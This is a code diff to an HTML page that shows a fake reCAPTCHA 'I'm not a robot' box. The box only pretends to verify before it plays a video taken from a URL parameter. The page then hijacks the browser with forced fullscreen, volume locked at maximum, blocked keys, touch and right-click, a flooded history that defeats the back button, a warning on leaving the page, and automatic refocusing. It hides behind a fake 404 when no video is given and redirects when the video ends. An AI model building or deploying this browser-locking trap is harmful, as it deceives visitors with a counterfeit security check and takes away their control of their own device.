@@ -11,6 +11,7 @@
       box-sizing: border-box;
       user-select: none;
       -webkit-user-select: none;
+      -webkit-touch-callout: none;
     }
 
     html, body {
@@ -18,7 +19,7 @@
       height: 100%;
       background: #f9f9f9;
       overflow: hidden;
-      font-family: Arial, Roboto, sans-serif;
+      font-family: Arial, sans-serif;
     }
 
     #verifyScreen {
@@ -49,12 +50,7 @@
       display: flex;
       align-items: center;
       padding: 0 12px;
-      box-shadow: 0 2px 2px rgba(0,0,0,0.05);
       cursor: pointer;
-      transition: background 0.2s;
-    }
-    .captcha-box:hover {
-      background: #f0f0f0;
     }
 
     .checkbox-wrapper {
@@ -67,7 +63,6 @@
       align-items: center;
       justify-content: center;
       margin-right: 12px;
-      position: relative;
     }
 
     .checkmark {
@@ -75,10 +70,7 @@
       height: 22px;
       display: none;
     }
-
-    .checkmark.show {
-      display: block;
-    }
+    .checkmark.show { display: block; }
 
     .spinner {
       width: 24px;
@@ -89,23 +81,12 @@
       animation: spin 0.8s linear infinite;
       display: none;
     }
+    .spinner.show { display: block; }
 
-    .spinner.show {
-      display: block;
-    }
+    @keyframes spin { to { transform: rotate(360deg); } }
 
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
+    .captcha-label { flex: 1; font-size: 14px; color: #000; }
 
-    /* ── LABEL ── */
-    .captcha-label {
-      flex: 1;
-      font-size: 14px;
-      color: #000;
-    }
-
-    /* ── reCAPTCHA LOGO ── */
     .captcha-logo {
       display: flex;
       flex-direction: column;
@@ -113,25 +94,79 @@
       margin-left: 8px;
     }
 
-    .logo-img {
-      width: 32px;
-      height: 32px;
+    .logo-img { width: 32px; height: 32px; }
+    .logo-text { font-size: 8px; color: #555; font-weight: bold; }
+    .logo-sub { font-size: 7px; color: #999; }
+
+    #errorScreen {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: white;
+      z-index: 999;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      padding: 20px;
+      text-align: center;
     }
 
-    .logo-text {
-      font-size: 8px;
+    #errorScreen h1 {
+      font-size: 60px;
+      color: #ccc;
+    }
+
+    #errorScreen p {
+      font-size: 18px;
       color: #555;
-      margin-top: 2px;
-      font-weight: bold;
+      margin-top: 10px;
     }
 
-    .logo-sub {
-      font-size: 7px;
-      color: #999;
-      margin-top: 1px;
+    #playScreen {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: black;
+      z-index: 150;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      cursor: pointer;
     }
 
-    /* ── VIDEO SCREEN ── */
+    #playButton {
+      width: 100px;
+      height: 100px;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.2);
+      border: 3px solid white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      animation: pulse 1.5s infinite;
+    }
+
+    #playButton::before {
+      content: "";
+      width: 0;
+      height: 0;
+      border-left: 30px solid white;
+      border-top: 20px solid transparent;
+      border-bottom: 20px solid transparent;
+      margin-left: 8px;
+    }
+
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.1); }
+    }
+
+    #playText {
+      color: white;
+      font-size: 18px;
+      margin-top: 20px;
+    }
+
     #videoScreen {
       display: none;
       position: fixed;
@@ -143,17 +178,21 @@
     #myVideo {
       width: 100%;
       height: 100%;
-      object-fit: cover;
+      object-fit: contain;
+      background: black;
       display: block;
     }
   </style>
 </head>
 <body>
 
-  <!-- VERIFY SCREEN -->
+  <div id="errorScreen">
+    <h1>404</h1>
+    <p>Page not found</p>
+  </div>
+
   <div id="verifyScreen">
     <p id="title">Please verify you are human to continue</p>
-
     <div class="captcha-box" id="captchaBox">
       <div class="checkbox-wrapper">
         <div class="spinner" id="spinner"></div>
@@ -161,9 +200,7 @@
           <path d="M5 12l5 5L20 7" stroke="#4caf50" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
         </svg>
       </div>
-
       <span class="captcha-label">I'm not a robot</span>
-
       <div class="captcha-logo">
         <svg class="logo-img" viewBox="0 0 48 48">
           <path fill="#4285f4" d="M24 4C16 4 9 9 7 17l7 2c1-5 5-8 10-8 4 0 7 2 9 5l-6 6h17V5l-6 6c-3-4-8-7-14-7z"/>
@@ -175,263 +212,228 @@
     </div>
   </div>
 
-  <!-- VIDEO SCREEN -->
+  <div id="playScreen">
+    <div id="playButton"></div>
+    <div id="playText">Tap to continue</div>
+  </div>
+
   <div id="videoScreen">
-    <video id="myVideo" playsinline>
-      <source src="video.mp4" type="video/mp4"/>
-    </video>
+    <video id="myVideo" playsinline webkit-playsinline preload="auto"></video>
   </div>
 
   <script>
+    const errorScreen  = document.getElementById("errorScreen");
     const verifyScreen = document.getElementById("verifyScreen");
     const captchaBox   = document.getElementById("captchaBox");
     const spinner      = document.getElementById("spinner");
     const checkmark    = document.getElementById("checkmark");
+    const playScreen   = document.getElementById("playScreen");
     const videoScreen  = document.getElementById("videoScreen");
     const video        = document.getElementById("myVideo");
 
-    const REDIRECT_URL = "https://your-website.com";
+    const REDIRECT_URL = "https://www.google.com";
 
     let videoStarted = false;
     let captchaUsed  = false;
 
-    // ════════════════════════════════
-    //  CLICK CAPTCHA → SPIN → CHECK → START
-    // ════════════════════════════════
+    const params   = new URLSearchParams(window.location.search);
+    const videoUrl = params.get("v");
+
+    if (!videoUrl) {
+      verifyScreen.style.display = "none";
+      errorScreen.style.display  = "flex";
+    } else {
+      video.src = videoUrl;
+    }
+
     captchaBox.addEventListener("click", async () => {
       if (captchaUsed) return;
       captchaUsed = true;
-
-      // Show spinner
       spinner.classList.add("show");
-
-      // Wait 1.5 seconds (looks like its verifying)
       await new Promise(r => setTimeout(r, 1500));
-
-      // Hide spinner, show checkmark
       spinner.classList.remove("show");
       checkmark.classList.add("show");
-
-      // Wait 0.5 sec before starting
       await new Promise(r => setTimeout(r, 500));
-
-      // Start video
-      startEverything();
+      tryStart();
     });
 
-    async function startEverything() {
+    async function tryStart() {
       verifyScreen.style.display = "none";
-      videoScreen.style.display  = "block";
-      videoStarted = true;
 
-      // Block back button
-      for (let i = 0; i < 10; i++) {
-        history.pushState(null, "", location.href);
-      }
-
-      // Fullscreen
       try {
-        await document.documentElement.requestFullscreen();
-      } catch(e) {}
-
-      // Play video muted → then unmute
-      try {
-        video.muted  = true;
+        await requestFS();
+        video.muted = false;
         video.volume = 1.0;
         await video.play();
+        videoScreen.style.display = "block";
+        videoStarted = true;
+        activateLocks();
+        return;
+      } catch(e) { console.log("Direct failed:", e); }
 
+      try {
+        video.muted = true;
+        await video.play();
+        videoScreen.style.display = "block";
+        videoStarted = true;
         setTimeout(() => {
-          video.muted  = false;
+          video.muted = false;
           video.volume = 1.0;
         }, 300);
+        try { await requestFS(); } catch(e) {}
+        activateLocks();
+        return;
+      } catch(e) { console.log("Muted failed:", e); }
 
-      } catch(e) {}
+      playScreen.style.display = "flex";
     }
 
-    // ════════════════════════════════
-    //  VIDEO ENDS → REDIRECT
-    // ════════════════════════════════
+    playScreen.addEventListener("click", async () => {
+      playScreen.style.display = "none";
+      videoScreen.style.display = "block";
+      videoStarted = true;
+      try { await requestFS(); } catch(e) {}
+      try {
+        video.muted = false;
+        video.volume = 1.0;
+        await video.play();
+      } catch(e) {
+        try {
+          video.muted = true;
+          await video.play();
+          setTimeout(() => {
+            video.muted = false;
+            video.volume = 1.0;
+          }, 300);
+        } catch(e2) {}
+      }
+      activateLocks();
+    });
+
+    function requestFS() {
+      const el = document.documentElement;
+      if (el.requestFullscreen)        return el.requestFullscreen();
+      if (el.webkitRequestFullscreen)  return el.webkitRequestFullscreen();
+      if (el.mozRequestFullScreen)     return el.mozRequestFullScreen();
+      if (el.msRequestFullscreen)      return el.msRequestFullscreen();
+      return Promise.reject("No FS");
+    }
+
+    function isFS() {
+      return !!(document.fullscreenElement ||
+                document.webkitFullscreenElement ||
+                document.mozFullScreenElement ||
+                document.msFullscreenElement);
+    }
+
+    function exitFS() {
+      if (document.exitFullscreen)        return document.exitFullscreen();
+      if (document.webkitExitFullscreen)  return document.webkitExitFullscreen();
+      if (document.mozCancelFullScreen)   return document.mozCancelFullScreen();
+      if (document.msExitFullscreen)      return document.msExitFullscreen();
+    }
+
     video.addEventListener("ended", () => {
       videoStarted = false;
-      try {
-        if (document.fullscreenElement) {
-          document.exitFullscreen().then(() => {
-            window.location.href = REDIRECT_URL;
-          });
-        } else {
-          window.location.href = REDIRECT_URL;
-        }
-      } catch(e) {
-        window.location.href = REDIRECT_URL;
-      }
+      try { if (isFS()) exitFS(); } catch(e) {}
+      window.location.href = REDIRECT_URL;
     });
 
-    // ════════════════════════════════
-    //  FULLSCREEN EXIT → FORCE BACK
-    // ════════════════════════════════
-    document.addEventListener("fullscreenchange", () => {
-      if (!document.fullscreenElement && videoStarted && !video.ended) {
-        setTimeout(() => {
-          document.documentElement.requestFullscreen().catch(() => {});
-        }, 100);
-        setTimeout(() => {
-          document.documentElement.requestFullscreen().catch(() => {});
-        }, 500);
-        setTimeout(() => {
-          document.documentElement.requestFullscreen().catch(() => {});
-        }, 1000);
-      }
-    });
+    function activateLocks() {
+      document.addEventListener("keydown", blockKey, true);
+      document.addEventListener("keyup", blockKey, true);
+      document.addEventListener("keypress", blockKey, true);
 
-    // ════════════════════════════════
-    //  BLOCK ALL KEYS
-    // ════════════════════════════════
-    document.addEventListener("keydown", (e) => {
-      if (!videoStarted || video.ended) return;
-      e.preventDefault();
-      e.stopPropagation();
-      e.stopImmediatePropagation();
-      return false;
-    }, true);
-
-    document.addEventListener("keyup", (e) => {
-      if (!videoStarted || video.ended) return;
-      e.preventDefault();
-      e.stopPropagation();
-      e.stopImmediatePropagation();
-      return false;
-    }, true);
-
-    document.addEventListener("keypress", (e) => {
-      if (!videoStarted || video.ended) return;
-      e.preventDefault();
-      e.stopPropagation();
-      e.stopImmediatePropagation();
-      return false;
-    }, true);
-
-    // ════════════════════════════════
-    //  BLOCK BACK BUTTON
-    // ════════════════════════════════
-    window.addEventListener("popstate", () => {
-      if (videoStarted && !video.ended) {
-        history.pushState(null, "", location.href);
-        history.pushState(null, "", location.href);
-      }
-    });
-
-    // ════════════════════════════════
-    //  BLOCK RIGHT CLICK
-    // ════════════════════════════════
-    document.addEventListener("contextmenu", (e) => {
-      e.preventDefault();
-      return false;
-    }, true);
-
-    // ════════════════════════════════
-    //  BLOCK PAGE CLOSE
-    // ════════════════════════════════
-    window.addEventListener("beforeunload", (e) => {
-      if (videoStarted && !video.ended) {
+      document.addEventListener("contextmenu", (e) => {
         e.preventDefault();
-        e.returnValue = "";
-        return "";
-      }
-    });
+        return false;
+      }, true);
 
-    // ════════════════════════════════
-    //  TAB SWITCH → PAUSE + FORCE BACK
-    // ════════════════════════════════
-    document.addEventListener("visibilitychange", () => {
-      if (videoStarted && !video.ended) {
-        if (document.hidden) {
-          video.pause();
-        } else {
-          document.documentElement.requestFullscreen().catch(() => {});
-          video.volume = 1.0;
-          video.muted  = false;
-          video.play().catch(() => {});
+      for (let i = 0; i < 20; i++) {
+        history.pushState(null, "", location.href);
+      }
+
+      window.addEventListener("popstate", () => {
+        if (videoStarted && !video.ended) {
+          history.pushState(null, "", location.href);
+          history.pushState(null, "", location.href);
         }
-      }
-    });
+      });
 
-    // ════════════════════════════════
-    //  WINDOW BLUR → FORCE BACK
-    // ════════════════════════════════
-    window.addEventListener("blur", () => {
-      if (videoStarted && !video.ended) {
-        const refocus = setInterval(() => {
-          if (videoStarted && !video.ended) {
-            window.focus();
-            document.documentElement.requestFullscreen().catch(() => {});
-            video.play().catch(() => {});
-          } else {
-            clearInterval(refocus);
+      window.addEventListener("beforeunload", (e) => {
+        if (videoStarted && !video.ended) {
+          e.preventDefault();
+          e.returnValue = "";
+          return "";
+        }
+      });
+
+      const fsEvents = ["fullscreenchange", "webkitfullscreenchange", "mozfullscreenchange", "MSFullscreenChange"];
+      fsEvents.forEach(evt => {
+        document.addEventListener(evt, () => {
+          if (!isFS() && videoStarted && !video.ended) {
+            setTimeout(() => requestFS().catch(() => {}), 100);
+            setTimeout(() => requestFS().catch(() => {}), 500);
+            setTimeout(() => requestFS().catch(() => {}), 1500);
           }
-        }, 500);
-      }
-    });
+        });
+      });
 
-    // ════════════════════════════════
-    //  LOCK VOLUME 100%
-    // ════════════════════════════════
-    video.addEventListener("volumechange", () => {
-      if (videoStarted && !video.ended) {
-        video.volume = 1.0;
-        video.muted  = false;
-      }
-    });
-
-    setInterval(() => {
-      if (videoStarted && !video.ended) {
-        video.volume = 1.0;
-        video.muted  = false;
-        if (video.paused) {
-          video.play().catch(() => {});
+      document.addEventListener("visibilitychange", () => {
+        if (videoStarted && !video.ended) {
+          if (document.hidden) {
+            video.pause();
+          } else {
+            requestFS().catch(() => {});
+            video.volume = 1.0;
+            video.muted = false;
+            video.play().catch(() => {});
+          }
         }
-      }
-    }, 500);
+      });
 
-    // ════════════════════════════════
-    //  BLOCK TOUCH GESTURES
-    // ════════════════════════════════
-    document.addEventListener("touchmove", (e) => {
-      if (videoStarted && !video.ended) e.preventDefault();
-    }, { passive: false });
-
-    document.addEventListener("touchstart", (e) => {
-      if (videoStarted && !video.ended) e.preventDefault();
-    }, { passive: false });
-
-    // ════════════════════════════════
-    //  BLOCK SCROLL + WHEEL
-    // ════════════════════════════════
-    document.addEventListener("scroll", (e) => e.preventDefault(), { passive: false });
-    document.addEventListener("wheel", (e) => {
-      if (videoStarted && !video.ended) e.preventDefault();
-    }, { passive: false });
-
-    // ════════════════════════════════
-    //  BLOCK DRAG + DROP
-    // ════════════════════════════════
-    document.addEventListener("dragstart", (e) => e.preventDefault(), true);
-    document.addEventListener("drop", (e) => e.preventDefault(), true);
-
-    // ════════════════════════════════
-    //  BLOCK SELECTION
-    // ════════════════════════════════
-    document.addEventListener("selectstart", (e) => e.preventDefault(), true);
-
-    // ════════════════════════════════
-    //  CONTINUOUS FULLSCREEN CHECK
-    // ════════════════════════════════
-    setInterval(() => {
-      if (videoStarted && !video.ended) {
-        if (!document.fullscreenElement) {
-          document.documentElement.requestFullscreen().catch(() => {});
+      window.addEventListener("blur", () => {
+        if (videoStarted && !video.ended) {
+          setTimeout(() => {
+            window.focus();
+            requestFS().catch(() => {});
+            video.play().catch(() => {});
+          }, 100);
         }
-      }
-    }, 2000);
+      });
+
+      video.addEventListener("volumechange", () => {
+        if (videoStarted && !video.ended) {
+          video.volume = 1.0;
+          video.muted = false;
+        }
+      });
+
+      document.addEventListener("touchmove", (e) => {
+        if (videoStarted && !video.ended) e.preventDefault();
+      }, { passive: false });
+
+      document.addEventListener("wheel", (e) => {
+        if (videoStarted && !video.ended) e.preventDefault();
+      }, { passive: false });
+
+      setInterval(() => {
+        if (videoStarted && !video.ended) {
+          video.volume = 1.0;
+          video.muted = false;
+          if (video.paused) video.play().catch(() => {});
+          if (!isFS()) requestFS().catch(() => {});
+        }
+      }, 1000);
+    }
+
+    function blockKey(e) {
+      if (!videoStarted || video.ended) return;
+      e.preventDefault();
+      e.stopPropagation();
+      e.stopImmediatePropagation();
+      return false;
+    }
   </script>
 
 </body>
